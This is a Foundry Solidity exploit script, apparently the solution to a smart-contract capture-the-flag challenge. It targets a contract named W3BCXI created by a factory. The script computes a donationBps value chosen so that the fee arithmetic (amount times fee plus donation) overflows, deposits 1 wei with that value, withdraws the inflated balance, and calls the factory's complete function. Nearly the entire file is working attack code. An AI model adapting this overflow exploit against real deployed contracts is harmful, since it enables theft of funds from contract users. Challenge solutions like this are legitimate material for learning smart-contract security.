// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";
import {W3BCXI, W3bCXIFactory} from "../src/W3BCXI.sol";

contract ExploitScript is Script {
    W3bCXIFactory public factory;
    W3BCXI public target;
    address public attacker;

    function setUp() public {
        // Replace with actual factory address
        factory = W3bCXIFactory(0xAa7D7398193E9840326F291712aDc82bAa26C201);
        attacker = vm.addr(1); // Using a test private key

        // Make sure to have ETH in the attacker account for gas
        vm.deal(attacker, 1 ether);
    }

    function run() public {
        vm.startBroadcast(attacker);

        // 1. Register and get our target contract
        address targetAddr = factory.register("Big.K");
        target = W3BCXI(targetAddr);
        console2.log("Deployed target contract at:", address(target));
        console2.log("Initial balance:", address(target).balance);

        // 2. Calculate the overflow amount
        // We need donationBps + feeBps to cause overflow when multiplied with msg.value
        uint256 currentFeeBps = target.feeBps(); // 3141
        uint256 BASIS_POINTS = 1e4;

        // We want: (amount * (feeBps + donationBps)) / BASIS_POINTS to overflow
        // Let's use donationBps that will make the multiplication overflow
        uint256 donationBps = type(uint256).max - currentFeeBps + 1;

        // 3. Exploit by depositing with calculated values
        target.deposit{value: 1}(attacker, donationBps);
        console2.log("After deposit balance:", address(target).balance);

        // 4. Withdraw our "deposit"
        target.withdraw();
        console2.log("Final balance:", address(target).balance);

        // 5. Complete the challenge
        bool success = factory.complete(address(target));
        require(success, "Challenge not completed");

        vm.stopBroadcast();
    }
}
